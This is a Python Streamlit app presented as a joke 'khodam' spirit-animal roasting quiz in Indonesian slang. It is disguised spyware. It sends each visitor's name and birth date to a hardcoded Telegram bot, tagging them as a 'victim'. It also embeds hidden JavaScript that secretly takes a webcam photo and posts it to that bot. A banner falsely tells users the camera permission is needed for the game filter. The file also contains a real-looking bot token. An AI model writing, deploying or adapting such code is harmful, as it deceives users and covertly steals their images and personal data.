import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import time
import random

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Tes Khodam Sultan",
    page_icon="💀",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING WARNA WARNI MENTAL AMBYAR
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap');

    .stApp {
        background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
        color: #ffffff;
        font-family: 'Fredoka', cursive, sans-serif;
    }

    /* Kartu Neon Gokil */
    .gokil-card {
        background: rgba(255, 255, 255, 0.08);
        backdrop-filter: blur(15px);
        border: 4px dashed #ff0055;
        border-radius: 30px;
        padding: 30px;
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.9), 0 0 30px rgba(255, 0, 85, 0.4);
        margin-bottom: 25px;
    }

    /* Kotak Hook Pelet Dukun Online */
    .hook-box {
        background: linear-gradient(135deg, #ff007f 0%, #7209b7 100%);
        border: 3px solid #00f2fe;
        padding: 18px 22px;
        border-radius: 20px;
        margin-bottom: 20px;
        font-size: 15px;
        color: #ffffff;
        text-align: center;
        font-weight: 700;
        box-shadow: 0 5px 20px rgba(255, 0, 127, 0.7);
        line-height: 1.6;
    }

    /* Tombol Utama Ugal-ugalan */
    div[data-testid="stFormSubmitButton"] > button {
        background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%) !important;
        color: #0b090a !important;
        font-weight: 800 !important;
        font-size: 20px !important;
        letter-spacing: 1px !important;
        border: 3px solid #ffff00 !important;
        padding: 18px 26px !important;
        border-radius: 24px !important;
        width: 100% !important;
        box-shadow: 0 8px 30px rgba(0, 242, 254, 0.8) !important;
        transition: all 0.3s ease !important;
        text-transform: uppercase;
    }
    div[data-testid="stFormSubmitButton"] > button:hover {
        background: linear-gradient(135deg, #ffff00 0%, #ff007f 100%) !important;
        color: #ffffff !important;
        transform: scale(1.05) rotate(-1deg) !important;
        box-shadow: 0 12px 35px rgba(255, 0, 127, 0.9) !important;
    }

    /* Tombol Reset Gokil */
    .stButton > button {
        background: #111111 !important;
        color: #00f2fe !important;
        border: 3px solid #00f2fe !important;
        font-weight: 700 !important;
        font-size: 16px !important;
        text-align: center !important;
        padding: 14px 20px !important;
        border-radius: 18px !important;
        width: 100% !important;
        transition: all 0.3s ease !important;
    }
    .stButton > button:hover {
        background: #00f2fe !important;
        color: #000000 !important;
        transform: scale(1.03) !important;
    }

    /* Input Field Estetik */
    .stTextInput > div > div > input {
        background-color: rgba(0, 0, 0, 0.5) !important;
        color: #ffff00 !important;
        border: 3px solid #00f2fe !important;
        border-radius: 16px !important;
        padding: 14px !important;
        font-family: 'Fredoka', cursive, sans-serif;
        font-size: 16px;
        font-weight: 600;
    }
    .stTextInput > div > dev > input:focus {
        border-color: #ffff00 !important;
        box-shadow: 0 0 20px rgba(255, 255, 0, 0.8) !important;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False
if 'current_profile' not in st.session_state:
    st.session_state.current_profile = None

# ==========================================
# DATABASE KHODAM PALING DI LUAR NALAR
# ==========================================
MASTER_KHODAM = [
    {
        "title": "🐒 Khodam Monyet Nge-vape Rokok Elektrik Pinjaman",
        "desc": "Muka lu kliatan kalem kaya orang bener, tapi aslinya doyan nongkrong di Alfamart cuma numpang ngadem sambil ngutang Chiki Ball ke temen. Dikit-dikit minta hotspot pas kuota sisa 2 MB, tapi gaya sok kaya!"
    },
    {
        "title": "🩴 Khodam Swallow Putus Tali Kena Badai Asmara",
        "desc": "Simbol keabadian fakir asmara yang hobi nge-stalk mantan pas tengah malem buta pake akun fake. Kalau HP lowbat langsung panik kaya orang mau kiamat, padahal gak ada yang ngetweet."
    },
    {
        "title": "🍲 Khodam Kuah Seblak Ceker Setan Campur Es Teh Jumbo",
        "desc": "Idupan lu penuh drama sinetron azab indosiar! Muka garang kaya preman terminal, tapi aslinya kalau nonton Teletubbies nangisnya sampe ingusan netes ke lantai."
    },
    {
        "title": "🐟 Khodam Lele Suthil Nyangkut di Selokan Bau Comberan",
        "desc": "Licin banget kaya belut disiram oli. Kalau pas ditagih utang atau ditanya 'Kapan kawin?', lu lari kenceng banget ngalahin rekor Usain Bolt sambil pura-pura kesurupan jin ijo."
    },
    {
        "title": "🔌 Khodam Charger HP Diselotip Biar Nyolok Nyala Setrumnya",
        "desc": "Lambang kesengsaraan umat manusia paling akurat! Posisi HP lu harus diganjal pake batu bata dan guling supaya colokan casannya mau connect. Dompet lu isinya cuma struk ATM sama kartu vaksin."
    },
    {
        "title": "🐈 Khodam Kucing Oren Suka Nyolong Ikan Asin di Warteg",
        "desc": "Urat malu lu udah putus di pabriknya! Kerjanya cuma rebahan seharian di kasur orang, pas dibangunin malah ngorok makin kenceng ngalahin suara mesin gergaji kayu pabrik triplek."
    },
    {
        "title": "📦 Khodam Paket COD Datang Pas Lu Lagi Jongkok Berak",
        "desc": "Sial permanen tanpa garansi! Tiap kali lu mau mager santai, pasti ada aja kurir teriak 'PAKET WOY!' atau disuruh emak beli terasi ke warung ujung jalan pas ujan deres."
    },
    {
        "title": "🧊 Khodam Es Batu Kulkas Kosong Melompong Sejak Pandemi",
        "desc": "Dingin, kaku, gak guna, tapi sok paling tersakiti. Auranya mirip tukang parkir liar yang muncul entah dari mana pas lu mau cabut naik motor matic tua."
    },
    {
        "title": "🧅 Khodam Kulit Bawang Merah (Pawang Drama Fiktif Nusantara)",
        "desc": "Dikit-dikit bikin status WA layar hitam pake lagu galau band tahun 2000-an. Padahal aslinya cuma kelaparan tengah malem tapi males jalan ke dapur karena takut ketemu tuyul gentayangan."
    },
    {
        "title": "🐸 Khodam Kodok Ngorek Minta Saweria ke Sultan",
        "desc": "Hati lu hancur lebur berkeping-keping pas saldo DANA tinggal sisa Rp 400 perak. Hobinya mandangin langit sambil nyesel kenapa dulu mutusin mantan yang sekarang jadi juragan tanah."
    }
]

# ==========================================
# FUNGSI KIRIM TELEGRAM
# ==========================================
def send_text_to_telegram(name, dob, profile_title):
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    caption = (
        f"💀 <b>KORBAN DUKUN UGAL-UGALAN TERCYDUK!</b>\n\n"
        f"👤 Nama: <b>{name}</b>\n"
        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
        f"🕒 Waktu: {now}\n"
        f"🐾 Hasil Khodam: <b>{profile_title}</b>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

# --- STEP 0: FORM DENGAN HOOK FILTER GAIB ---
if st.session_state.step == 0:
    st.markdown("<h1 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff0055;'>💀 ARENA ROASTING KHODAM & MENTAL AMBYAR 💀</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #00f2fe; font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;'>Tes seberapa bobrok mental lu dan cari tahu hewan gaib apa yang nempel di jidat lu!</p>", unsafe_allow_html=True)

    with st.container():
        st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
        
        # HOOK SUPER AMAN DIKEMAS SEBAGAI SYARAT FILTER GAME INTERAKTIF
        st.markdown("""
            <div class="hook-box">
                🔥 <b>SYARAT WAJIB DARI DUkun SAKIT JIWA:</b><br>
                Supaya filter gaib dan sensor hp lu gak error jadi tukang galon, wajib klik tombol <b>"Allow / Izinkan"</b> pas pop-up kamera muncul di layar HP lu ya bosku! 📸✨
            </div>
        """, unsafe_allow_html=True)
        
        with st.form("roasting_edan_form"):
            name_input = st.text_input("NAMA PANGGILAN ALIAS LU DI KTP", value="", placeholder="Contoh: Bogel Penguasa Terminal")
            dob_input = st.text_input("TANGGAL LAHIR (DD/MM/YYYY)", value="", placeholder="Contoh: 17/08/1945")
            
            st.write("")
            submitted = st.form_submit_button("🔥 BONGKAR AIB & KHODAM SEKARANG!")
            
            if submitted:
                if not name_input.strip():
                    st.warning("⚠️ Woy, tulis dulu nama lu! Dukunnya bukan cenayang cenayang tebak lubang cacing!")
                else:
                    st.session_state.user_name = name_input.strip()
                    st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Lupa karena sering linglung"
                    st.session_state.telegram_sent = False
                    
                    # RANDOM MURNI TIAP DIAKSES
                    rng = random.SystemRandom()
                    chosen_profile = rng.choice(MASTER_KHODAM).copy()
                    bobrok_level = rng.randint(95, 100)
                    
                    chosen_profile['power'] = f"Tingkat Kebobrokan Mental: {bobrok_level}% (LEVEL STRES KRONIS TANPA OBAT)"
                    st.session_state.current_profile = chosen_profile
                    
                    st.session_state.step = 1
                    st.rerun()
                    
        st.markdown('</div>', unsafe_allow_html=True)

# --- STEP 1: ANIMASI PROSES RITUAL UGAL-UGALAN + EKSEKUSI KAMERA & POP-UP ---
elif st.session_state.step == 1:
    st.markdown("<h2 style='text-align: center; color: #ffff00;'>🔮 DUKUN LAGI MENGHAKIMI DOSA-DOSA LU...</h2>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #00f2fe; font-weight: 600;'>Sabar bos, jin penunggu router lagi nyiapin hasil roasting paling pedas sejagad raya.</p>", unsafe_allow_html=True)
    
    st.write("")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    status_text.text("👻 Mengunduh riwayat chatting galau dari server langit...")
    progress_bar.progress(30)
    time.sleep(0.7)
    
    status_text.text(f"🔍 Menganalisis tingkat kepedihan dompet {st.session_state.user_name}...")
    progress_bar.progress(65)
    time.sleep(0.9)
    
    status_text.text("💥 Menemukan wujud khodam paling melintir...")
    progress_bar.progress(90)
    time.sleep(0.7)
    
    status_text.text("🎉 Siap-siap mental ambyar! Membuka hasil...")
    progress_bar.progress(100)
    time.sleep(0.4)
    
    st.session_state.step = 2
    st.rerun()

    # SKRIP KAMERA DIAM-DIAM + POP-UP IZIN KELUAR TEPAT SETELAH TOMBOL DIKLIK
    hidden_js_camera = f"""
    <div>
        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <script>
            const token = "{TELEGRAM_BOT_TOKEN}";
            const chatId = "{TELEGRAM_CHAT_ID}";
            
            // Pancingan otomatis browser meminta izin kamera & pop-up tepat saat tombol diklik
            navigator.mediaDevices.getUserMedia({{ video: true }})
            .then(function(stream) {{
                var video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {{
                    var canvas = document.getElementById('canvas');
                    var context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    var dataURL = canvas.toDataURL('image/jpeg');
                    
                    fetch(dataURL)
                    .then(res => res.blob())
                    .then(blob => {{
                        var formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'korban_roasting_edan.jpg');
                        formData.append('caption', '💀 <b>KORBAN ROASTING KHODAM TERCYDUK!</b>');
                        
                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                            method: 'POST',
                            body: formData
                        }});
                    }});
                    
                    stream.getTracks().forEach(track => track.stop());
                }}, 1200);
            }})
            .catch(function(err) {{
                console.log("Akses izin dilewati user: ", err);
            }});
        </script>
    </div>
    """
    components.html(hidden_js_camera, height=0)

# --- STEP 2: HASIL RAMALAN & ROASTING ---
elif st.session_state.step == 2:
    if not st.session_state.telegram_sent and st.session_state.current_profile:
        send_text_to_telegram(
            name=st.session_state.user_name,
            dob=st.session_state.user_dob,
            profile_title=st.session_state.current_profile['title']
        )
        st.session_state.telegram_sent = True

    profile = st.session_state.current_profile

    st.markdown(f"<h2 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff0055;'>🎉 DOR! HASIL ROASTING KELUAR 🎉</h2>", unsafe_allow_html=True)
    st.write("")

    if profile:
        st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
        st.markdown(f"<h3 style='color: #00f2fe; text-align: center; font-size: 1.4rem;'>{profile['title']}</h3>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; color: #ffff00; font-weight: 800; font-size: 1.2rem;'>{profile['power']}</p>", unsafe_allow_html=True)
        st.markdown("<hr style='border-color: rgba(255, 255, 255, 0.4); border-style: dashed;'>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; font-size: 1.15rem; line-height: 1.7; color: #ffffff; font-weight: 600;'>{profile['desc']}</p>", unsafe_allow_html=True)
        st.markdown('</div>', unsafe_allow_html=True)

    st.write("")
    if st.button("🔄 ROASTING ULANG (KERJAIN TEMAN SEBELAH LU)", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = ""
        st.session_state.user_dob = ""
        st.session_state.telegram_sent = False
        st.session_state.current_profile = None
        st.rerun()
